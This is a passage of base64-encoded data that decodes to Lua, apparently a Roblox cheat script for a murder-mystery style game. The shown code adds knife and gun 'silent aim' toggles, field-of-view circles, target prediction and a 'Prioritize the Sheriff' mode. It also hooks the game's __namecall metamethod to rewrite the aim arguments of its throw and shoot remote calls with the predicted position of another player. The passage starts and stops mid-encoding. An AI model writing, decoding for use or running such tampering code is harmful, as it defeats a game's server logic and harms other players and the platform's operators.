WQpCiAgICBnZXRnZW52KCkuS25pZmVUYXJnZXRpbmdNb2RlID0gc2VsZWN0ZWQKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5LbmlmZVRhcmdldGluZ01vZGUgPSBzZWxlY3RlZAogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxLCAiU2VsZWN0IFRhcmdldCBJbnNpZGUgRk9WIiwgIlNlbGVjY2lvbmFyIG9iamV0aXZvIGRlbnRybyBkZWwgZm92IiwgZ2V0Z2VudigpLktuaWZlVXNlRk9WLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5LbmlmZVVzZUZPViA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVVc2VGT1YgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxLCAiU2hvdyBQcmVkaWN0aW9uIiwgIk1vc3RyYXIgcHJlZGljY2nDs24iLCBnZXRnZW52KCkuS25pZmVTaG93UHJlZGljdGlvbiwgZnVuY3Rpb24oc3RhdGUpCiAgICBnZXRnZW52KCkuS25pZmVTaG93UHJlZGljdGlvbiA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVTaG93UHJlZGljdGlvbiA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCgogICAgUHJlZGljdGlvbkluZGljYXRvci5WaXNpYmxlID0gc3RhdGUgYW5kIGdldGdlbnYoKS5LbmlmZUFpbUVuYWJsZWQKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMSwgIlNob3cgRk9WIENpcmNsZSIsICJNb3N0cmFyIGPDrXJjdWxvIGZvdiIsIGdldGdlbnYoKS5LbmlmZVNob3dGT1YsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLktuaWZlU2hvd0ZPViA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVTaG93Rk9WID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCiAgICBDaXJjbGUuVmlzaWJsZSA9IHN0YXRlIGFuZCBnZXRnZW52KCkuS25pZmVBaW1FbmFibGVkCmVuZCkKCkxpYnJhcnkuYWRkVGV4dGJveCh0YWIxLCAiRk9WIFNpemUiLCB0b3N0cmluZyhnZXRnZW52KCkuS25pZmVGT1ZTaXplKSwgIjkwIiwgZnVuY3Rpb24oaW5wdXRUZXh0KQogICAgbG9jYWwgbmV3U2l6ZSA9IHRvbnVtYmVyKGlucHV0VGV4dCkKICAgIGlmIG5ld1NpemUgdGhlbgogICAgICAgIGdldGdlbnYoKS5LbmlmZUZPVlNpemUgPSBtYXRoLmNsYW1wKG5ld1NpemUsIDUwLCA1MDApCiAgICAgICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlRk9WU2l6ZSA9IGdldGdlbnYoKS5LbmlmZUZPVlNpemUKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCgogICAgICAgIENpcmNsZS5SYWRpdXMgPSBnZXRnZW52KCkuS25pZmVGT1ZTaXplCiAgICBlbmQKZW5kKQoKTGlicmFyeS5BZGRDb2xvclBpY2tlcih0YWIxLCAiQ29sb3IgRk9WIiwgZ2V0Z2VudigpLktuaWZlRk9WQ29sb3IsIGZ1bmN0aW9uKGNvbG9yKQogICAgZ2V0Z2VudigpLktuaWZlRk9WQ29sb3IgPSBjb2xvcgogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlRk9WQ29sb3IgPSB7Y29sb3IuUiwgY29sb3IuRywgY29sb3IuQn0KICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCiAgICBDaXJjbGUuQ29sb3IgPSBjb2xvcgplbmQpCgpMaWJyYXJ5LmFkZFRleHRib3godGFiMSwgIktuaWZlL1ByZWRpY3Rpb24gSW50ZXJ2YWwgSG9yaXpvbnRhbCIsIHRvc3RyaW5nKHByZWRpY3Rpb25JbnRlcnZhbEhvcml6b250YWwpLCAiIiwgZnVuY3Rpb24oaW5wdXRUZXh0KQogICAgbG9jYWwgdmFsdWUgPSB0b251bWJlcihpbnB1dFRleHQpCiAgICBpZiB2YWx1ZSB0aGVuCiAgICAgICAgcHJlZGljdGlvbkludGVydmFsSG9yaXpvbnRhbCA9IG1hdGguY2xhbXAodmFsdWUsIDEsIDEwMCkKICAgICAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcucHJlZGljdGlvbkludGVydmFsSG9yaXpvbnRhbCA9IHByZWRpY3Rpb25JbnRlcnZhbEhvcml6b250YWwKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBlbmQKZW5kKQoKbG9jYWwgZnVuY3Rpb24gSGFzR3VuKHBsYXllcikKICAgIGxvY2FsIEJhY2twYWNrID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICBsb2NhbCBDaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICByZXR1cm4gKEJhY2twYWNrIGFuZCBCYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiR3VuIikpIG9yIChDaGFyYWN0ZXIgYW5kIENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiR3VuIikpCmVuZAoKbG9jYWwgZnVuY3Rpb24gSXNJbnNpZGVGT1YodGFyZ2V0UG9zKQogICAgaWYgbm90IGdldGdlbnYoKS5LbmlmZVVzZUZPViB0aGVuIHJldHVybiB0cnVlIGVuZAogICAgbG9jYWwgc2NyZWVuUG9zLCBvblNjcmVlbiA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludCh0YXJnZXRQb3MpCiAgICBpZiBvblNjcmVlbiB0aGVuCiAgICAgICAgbG9jYWwgZGlzdGFuY2UgPSAoVmVjdG9yMi5uZXcoc2NyZWVuUG9zLlgsIHNjcmVlblBvcy5ZKSAtIFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBDYW1lcmEuVmlld3BvcnRTaXplLlkvMikpLk1hZ25pdHVkZQogICAgICAgIHJldHVybiBkaXN0YW5jZSA8PSBnZXRnZW52KCkuS25pZmVGT1ZTaXplCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIElzVmFsaWRUYXJnZXQocGxheWVyKQogICAgcmV0dXJuIHBsYXllciBhbmQgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyLlByaW1hcnlQYXJ0CmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0S25pZmVUYXJnZXQoKQogICAgaWYgbm90IGdldGdlbnYoKS5LbmlmZUFpbUVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBDbG9zZXN0UGxheWVyLCBDbG9zZXN0RGlzdGFuY2UgPSBuaWwsIG1hdGguaHVnZQogICAgbG9jYWwgTG9jYWxSb290ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXIuUHJpbWFyeVBhcnQKICAgIGlmIG5vdCBMb2NhbFJvb3QgdGhlbiByZXR1cm4gZW5kCgogICAgZm9yIF8sIFBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBJc1ZhbGlkVGFyZ2V0KFBsYXllcikgdGhlbgogICAgICAgICAgICBsb2NhbCBUYXJnZXRSb290ID0gUGxheWVyLkNoYXJhY3Rlci5QcmltYXJ5UGFydAogICAgICAgICAgICBsb2NhbCBEaXN0YW5jZSA9IChMb2NhbFJvb3QuUG9zaXRpb24gLSBUYXJnZXRSb290LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgaWYgSXNJbnNpZGVGT1YoVGFyZ2V0Um9vdC5Qb3NpdGlvbikgYW5kIERpc3RhbmNlIDwgQ2xvc2VzdERpc3RhbmNlIHRoZW4KICAgICAgICAgICAgICAgIGlmIGdldGdlbnYoKS5LbmlmZVRhcmdldGluZ01vZGUgPT0gIlByaW9yaXRpemUgdGhlIFNoZXJpZmYiIGFuZCBIYXNHdW4oUGxheWVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXllcgogICAgICAgICAgICAgICAgZWxzZWlmIGdldGdlbnYoKS5LbmlmZVRhcmdldGluZ01vZGUgPT0gIk5vcm1hbCIgdGhlbgogICAgICAgICAgICAgICAgICAgIENsb3Nlc3RQbGF5ZXIsIENsb3Nlc3REaXN0YW5jZSA9IFBsYXllciwgRGlzdGFuY2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIENsb3Nlc3RQbGF5ZXIKZW5kCgpsb2NhbCBmdW5jdGlvbiBHZXRLbmlmZVByZWRpY3Rpb24oKQogICAgaWYgbm90IGdldGdlbnYoKS5LbmlmZUFpbUVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBUYXJnZXQgPSBHZXRLbmlmZVRhcmdldCgpCiAgICBpZiBUYXJnZXQgdGhlbgogICAgICAgIGxvY2FsIFRhcmdldFJvb3QgPSBUYXJnZXQuQ2hhcmFjdGVyIGFuZCBUYXJnZXQuQ2hhcmFjdGVyLlByaW1hcnlQYXJ0CiAgICAgICAgaWYgVGFyZ2V0Um9vdCB0aGVuCiAgICAgICAgICAgIGxvY2FsIFRhcmdldFZlbG9jaXR5ID0gVGFyZ2V0Um9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5CiAgICAgICAgICAgIGxvY2FsIFByZWRpY3Rpb25GYWN0b3IgPSBwcmVkaWN0aW9uSW50ZXJ2YWxIb3Jpem9udGFsIC8gMTAwCiAgICAgICAgICAgIGxvY2FsIFByZWRpY3RlZFBvc2l0aW9uID0gVGFyZ2V0Um9vdC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KFRhcmdldFZlbG9jaXR5LlgsIDAsIFRhcmdldFZlbG9jaXR5LlopICogUHJlZGljdGlvbkZhY3RvcgoKICAgICAgICAgICAgaWYgZ2V0Z2VudigpLktuaWZlU2hvd1ByZWRpY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgU2NyZWVuUG9zLCBPblNjcmVlbiA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChQcmVkaWN0ZWRQb3NpdGlvbikKICAgICAgICAgICAgICAgIGlmIE9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgICAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcoU2NyZWVuUG9zLlgsIFNjcmVlblBvcy5ZKQogICAgICAgICAgICAgICAgICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIFByZWRpY3RlZFBvc2l0aW9uCiAgICAgICAgZW5kCiAgICBlbmQKICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IGZhbHNlCiAgICByZXR1cm4gbmlsCmVuZAoKUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IGdldGdlbnYoKS5LbmlmZUFpbUVuYWJsZWQgdGhlbgogICAgICAgIENpcmNsZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSBmYWxzZQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBDaXJjbGUuVmlzaWJsZSA9IGdldGdlbnYoKS5LbmlmZVNob3dGT1YKICAgIGdldGdlbnYoKS5LbmlmZVNpbGVudEFpbS5DdXJyZW50UHJlZGljdGlvbiA9IEdldEtuaWZlUHJlZGljdGlvbigpIG9yIGdldGdlbnYoKS5LbmlmZVNpbGVudEFpbS5DdXJyZW50UHJlZGljdGlvbgplbmQpCgpMaWJyYXJ5LmFkZExhYmVsKHRhYjEsICJHdW4gc2lsZW50IGFpbSIpCgpnZXRnZW52KCkuc2F2ZWRDb25maWcgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcgb3IgZ2V0Z2VudigpLmxvYWRDb25maWcoKQoKZ2V0Z2VudigpLlNoYXJwbmVzc011bHRpcGxpZXIgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuU2hhcnBuZXNzTXVsdGlwbGllciBvciAwLjUKZ2V0Z2VudigpLkd1blNpbGVudEFpbSA9IHtDdXJyZW50UHJlZGljdGlvbiA9IFZlY3RvcjMuemVyb30KZ2V0Z2VudigpLlNpbGVudEFpbUVuYWJsZWQgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuU2lsZW50QWltRW5hYmxlZCBvciBmYWxzZQpnZXRnZW52KCkuR3VuU2hhcnBuZXNzRW5hYmxlZCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5HdW5TaGFycG5lc3NFbmFibGVkIG9yIGZhbHNlCmdldGdlbnYoKS5QcmVkaWN0aW9uVHlwZSA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5QcmVkaWN0aW9uVHlwZSBvciAiRHluYW1pYyIKZ2V0Z2VudigpLlNob3dQcmVkaWN0aW9uSW5kaWNhdG9yID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLlNob3dQcmVkaWN0aW9uSW5kaWNhdG9yIG9yIGZhbHNlCgpsb2NhbCBwcmVkaWN0aW9uSW50ZXJ2YWxIb3Jpem9udGFsID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkd1blByZWRpY3Rpb25Ib3Jpem9udGFsIG9yIDEyCmxvY2FsIHByZWRpY3Rpb25JbnRlcnZhbFZlcnRpY2FsID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkd1blByZWRpY3Rpb25WZXJ0aWNhbCBvciA1Cgpsb2NhbCBQcmVkaWN0aW9uSW5kaWNhdG9yID0gRHJhd2luZy5uZXcoIkNpcmNsZSIpClByZWRpY3Rpb25JbmRpY2F0b3IuQ29sb3IgPSBDb2xvcjMubmV3KDAsIDAsIDEpClByZWRpY3Rpb25JbmRpY2F0b3IuUmFkaXVzID0gNApQcmVkaWN0aW9uSW5kaWNhdG9yLlRoaWNrbmVzcyA9IDEKUHJlZGljdGlvbkluZGljYXRvci5GaWxsZWQgPSBmYWxzZQpQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSBnZXRnZW52KCkuU2hvd1ByZWRpY3Rpb25JbmRpY2F0b3IKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJHdW4gU2lsZW50IEFpbSIsICIiLCBnZXRnZW52KCkuU2lsZW50QWltRW5hYmxlZCwgZnVuY3Rpb24oc3RhdGUpCiAgICBnZXRnZW52KCkuU2lsZW50QWltRW5hYmxlZCA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuU2lsZW50QWltRW5hYmxlZCA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJHdW4gU2hhcnBuZXNzIFNob290ZXIiLCAiUGlzdG9sYSBhZmlsYWRvIiwgZ2V0Z2VudigpLkd1blNoYXJwbmVzc0VuYWJsZWQsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLkd1blNoYXJwbmVzc0VuYWJsZWQgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkd1blNoYXJwbmVzc0VuYWJsZWQgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxLCAiU2hvdyBQcmVkaWN0aW9uIEluZGljYXRvciIsICJWZXIgcHJlZGljY2nDs24iLCBnZXRnZW52KCkuU2hvd1ByZWRpY3Rpb25JbmRpY2F0b3IsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLlNob3dQcmVkaWN0aW9uSW5kaWNhdG9yID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5TaG93UHJlZGljdGlvbkluZGljYXRvciA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSBzdGF0ZQplbmQpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjEsICJHdW4gUHJlZGljdGlvbiBUeXBlIiwgZ2V0Z2VudigpLlByZWRpY3Rpb25UeXBlLCB7IkR5bmFtaWMiLCAiU3RhdGljIiwgIldpdGggUGluZyJ9LCBmdW5jdGlvbihzZWxlY3RlZCkKICAgIGdldGdlbnYoKS5QcmVkaWN0aW9uVHlwZSA9IHNlbGVjdGVkCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuUHJlZGljdGlvblR5cGUgPSBzZWxlY3RlZAogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWIxLCAiUHJlZGljdGlvbiBJbnRlcnZhbCBIb3Jpem9udGFsIiwgIiIsIDEsIDE1LCBwcmVkaWN0aW9uSW50ZXJ2YWxIb3Jpem9udGFsLCBmdW5jdGlvbih2YWx1ZSkKICAgIHByZWRpY3Rpb25JbnRlcnZhbEhvcml6b250YWwgPSB2YWx1ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkd1blByZWRpY3Rpb25Ib3Jpem9udGFsID0gdmFsdWUKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiMSwgIlByZWRpY3Rpb24gSW50ZXJ2YWwgVmVydGljYWwiLCAiIiwgMSwgNiwgcHJlZGljdGlvbkludGVydmFsVmVydGljYWwsIGZ1bmN0aW9uKHZhbHVlKQogICAgcHJlZGljdGlvbkludGVydmFsVmVydGljYWwgPSB2YWx1ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkd1blByZWRpY3Rpb25WZXJ0aWNhbCA9IHZhbHVlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKCmxvY2FsIGZ1bmN0aW9uIEhhc0tuaWZlKHBsYXllcikKICAgIGxvY2FsIEJhY2twYWNrID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICBsb2NhbCBDaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICByZXR1cm4gKEJhY2twYWNrIGFuZCBCYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKSkgb3IgKENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJLbmlmZSIpKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEdldENsb3Nlc3RHdW5UYXJnZXQoKQogICAgaWYgbm90IGdldGdlbnYoKS5TaWxlbnRBaW1FbmFibGVkIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgQ2xvc2VzdFBsYXllciwgQ2xvc2VzdERpc3RhbmNlID0gbmlsLCBtYXRoLmh1Z2UKICAgIGxvY2FsIExvY2FsUm9vdCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlByaW1hcnlQYXJ0CiAgICBpZiBub3QgTG9jYWxSb290IHRoZW4gcmV0dXJuIGVuZAoKICAgIGZvciBfLCBQbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgUGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgbG9jYWwgVGFyZ2V0Um9vdCA9IFBsYXllci5DaGFyYWN0ZXIgYW5kIFBsYXllci5DaGFyYWN0ZXIuUHJpbWFyeVBhcnQKICAgICAgICAgICAgaWYgVGFyZ2V0Um9vdCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBEaXN0YW5jZSA9IChMb2NhbFJvb3QuUG9zaXRpb24gLSBUYXJnZXRSb290LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgIGlmIERpc3RhbmNlIDwgQ2xvc2VzdERpc3RhbmNlIGFuZCBIYXNLbmlmZShQbGF5ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBDbG9zZXN0UGxheWVyLCBDbG9zZXN0RGlzdGFuY2UgPSBQbGF5ZXIsIERpc3RhbmNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBDbG9zZXN0UGxheWVyCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0R3VuUHJlZGljdGlvbigpCiAgICBpZiBub3QgZ2V0Z2VudigpLlNpbGVudEFpbUVuYWJsZWQgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgbG9jYWwgTG9jYWxSb290ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXIuUHJpbWFyeVBhcnQKICAgIGlmIG5vdCBMb2NhbFJvb3QgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgVGFyZ2V0ID0gR2V0Q2xvc2VzdEd1blRhcmdldCgpCiAgICBpZiBUYXJnZXQgdGhlbgogICAgICAgIGxvY2FsIFRhcmdldFJvb3QgPSBUYXJnZXQuQ2hhcmFjdGVyIGFuZCBUYXJnZXQuQ2hhcmFjdGVyLlByaW1hcnlQYXJ0CiAgICAgICAgaWYgVGFyZ2V0Um9vdCB0aGVuCiAgICAgICAgICAgIGxvY2FsIFByZWRpY3Rpb24gPSBUYXJnZXRSb290LlBvc2l0aW9uCiAgICAgICAgICAgIGxvY2FsIFRhcmdldFZlbG9jaXR5ID0gVGFyZ2V0Um9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5CgogICAgICAgICAgICBpZiBnZXRnZW52KCkuUHJlZGljdGlvblR5cGUgPT0gIkR5bmFtaWMiIHRoZW4KICAgICAgICAgICAgICAgIFByZWRpY3Rpb24gPSBQcmVkaWN0aW9uICsgKFRhcmdldFZlbG9jaXR5ICogKHByZWRpY3Rpb25JbnRlcnZhbEhvcml6b250YWwgLyAxMDApKSArIFZlY3RvcjMubmV3KDAsIHByZWRpY3Rpb25JbnRlcnZhbFZlcnRpY2FsIC8gMTAwLCAwKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIGdldGdlbnYoKS5HdW5TaGFycG5lc3NFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIFByZWRpY3Rpb24gPSBQcmVkaWN0aW9uOkxlcnAoVGFyZ2V0Um9vdC5Qb3NpdGlvbiwgZ2V0Z2VudigpLlNoYXJwbmVzc011bHRpcGxpZXIpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgZ2V0Z2VudigpLlNob3dQcmVkaWN0aW9uSW5kaWNhdG9yIHRoZW4KICAgICAgICAgICAgICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhQcmVkaWN0aW9uLlgsIFByZWRpY3Rpb24uWSkKICAgICAgICAgICAgICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgUHJlZGljdGlvbkluZGljYXRvci5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gUHJlZGljdGlvbgogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gbmlsCmVuZAoKbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKClJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGdldGdlbnYoKS5TaWxlbnRBaW1FbmFibGVkIHRoZW4KICAgICAgICBsb2NhbCBQcmVkaWN0aW9uID0gR2V0R3VuUHJlZGljdGlvbigpCiAgICAgICAgZ2V0Z2VudigpLkd1blNpbGVudEFpbS5DdXJyZW50UHJlZGljdGlvbiA9IFByZWRpY3Rpb24gb3IgZ2V0Z2VudigpLkd1blNpbGVudEFpbS5DdXJyZW50UHJlZGljdGlvbgoKICAgICAgICBpZiBnZXRnZW52KCkuU2hvd1ByZWRpY3Rpb25JbmRpY2F0b3IgYW5kIFByZWRpY3Rpb24gdGhlbgogICAgICAgICAgICBsb2NhbCBTY3JlZW5Qb3NpdGlvbiwgT25TY3JlZW4gPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQoUHJlZGljdGlvbikKICAgICAgICAgICAgaWYgT25TY3JlZW4gdGhlbgogICAgICAgICAgICAgICAgUHJlZGljdGlvbkluZGljYXRvci5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KFNjcmVlblBvc2l0aW9uLlgsIFNjcmVlblBvc2l0aW9uLlkpCiAgICAgICAgICAgICAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgUHJlZGljdGlvbkluZGljYXRvci5WaXNpYmxlID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBQcmVkaWN0aW9uSW5kaWNhdG9yLlZpc2libGUgPSBmYWxzZQogICAgZW5kCmVuZCkKCmxvY2FsIE9sZE5hbWVDYWxsICAKT2xkTmFtZUNhbGwgPSBob29rbWV0YW1ldGhvZChnYW1lLCAiX19uYW1lY2FsbCIsIGZ1bmN0aW9uKE9iamVjdCwgLi4uKSAgCiAgICBsb2NhbCBOYW1lY2FsbE1ldGhvZCA9IGdldG5hbWVjYWxsbWV0aG9kKCkgIAogICAgbG9jYWwgQXJndW1lbnRzID0gey4uLn0gIAogIAogICAgaWYgZ2V0Z2VudigpLktuaWZlQWltRW5hYmxlZCBhbmQgTmFtZWNhbGxNZXRob2QgPT0gIkZpcmVTZXJ2ZXIiIGFuZCB0b3N0cmluZyhPYmplY3QpID09ICJUaHJvdyIgdGhlbiAgCiAgICAgICAgbG9jYWwgU3VjY2VzcywgRXJyb3IgPSBwY2FsbChmdW5jdGlvbigpICAKICAgICAgICAgICAgQXJndW1lbnRzWzFdID0gQ0ZyYW1lLm5ldyhnZXRnZW52KCkuS25pZmVTaWxlbnRBaW0uQ3VycmVudFByZWRpY3Rpb24pICAKICAgICAgICBlbmQpICAKICAgICAgICBpZiBFcnJvciB0aGVuIHdhcm4oIkVycm9yISA6IiwgRXJyb3IpIGVuZCAgCiAgICAgICAgcmV0dXJuIE9sZE5hbWVDYWxsKE9iamVjdCwgdW5wYWNrKEFyZ3VtZW50cykpICAKICAgIGVuZCAgCiAgCiAgICBpZiBnZXRnZW52KCkuU2lsZW50QWltRW5hYmxlZCBhbmQgTmFtZWNhbGxNZXRob2QgPT0gIkludm9rZVNlcnZlciIgYW5kIHRvc3RyaW5nKE9iamVjdCkgPT0gIlJlbW90ZUZ1bmN0aW9uIiB0aGVuICAKICAgICAgICBsb2NhbCBTdWNjZXNzLCBFcnJvciA9IHBjYWxsKGZ1bmN0aW9uKCkgIAogICAgICAgICAgICBBcmd1bWVudHNbMl0gPSBnZXRnZW52KCkuR3VuU2lsZW50QWltLkN1cnJlbnRQcmVkaWN0aW9uICAKICAgICAgICBlbmQpICAKICAgICAgICBpZiBFcnJvciB0aGVuIHdhcm4oIkVycm9yISA6IiwgRXJyb3IpIGVuZCAgCiAgICAgICAgcmV0dXJuIE9sZE5hbWVDYWxsKE9iamVjdCwgdW5wYWNrKEFyZ3VtZW50cykpICAKICAgIGVuZCAgCiAgCiAgICByZXR1cm4gT2xkTmFtZUNhbGwoT2JqZWN0LCB1bnBhY2soQXJndW1lbnRzKSkgIAplbmQpICAKCgpMaWJyYXJ5LmFkZEJ1dHRvbih